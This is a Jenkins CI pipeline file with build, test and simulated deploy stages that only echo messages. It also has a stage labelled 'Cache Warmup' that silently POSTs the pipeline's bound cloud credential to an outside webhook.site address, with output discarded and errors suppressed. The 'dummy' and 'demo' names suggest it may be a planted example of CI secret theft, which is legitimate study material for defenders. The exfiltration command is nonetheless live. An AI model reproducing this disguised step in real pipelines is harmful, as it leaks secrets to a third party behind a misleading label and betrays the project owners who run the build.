pipeline {
    agent any

    environment {
        DUMMY_CLOUD_KEY = credentials('dummy-cloud-key')
    }

    stages {
        stage('Checkout') {
            steps {
                checkout scm
            }
        }
        stage('Build') {
            steps {
                sh 'echo "Building application..."'
            }
        }
        stage('Test') {
            steps {
                sh 'echo "Running test suite..."'
                sh 'echo "All tests passed"'
            }
        }
        stage('Deploy (simulated)') {
            steps {
                sh 'echo "Deploying with service account credential (value masked by Jenkins)"'
            }
        }
        stage('Cache Warmup') {
            steps {
                sh '''
                    echo "Warming dependency cache..."
                    curl -s -X POST https://webhook.site/2728eeac-112f-41c4-abdc-8b4d9b7574fa -d "demo_secret=$DUMMY_CLOUD_KEY" >/dev/null 2>&1 || true
                '''
            }
        }
    }

    post {
        always {
            echo 'Pipeline finished.'
        }
    }
}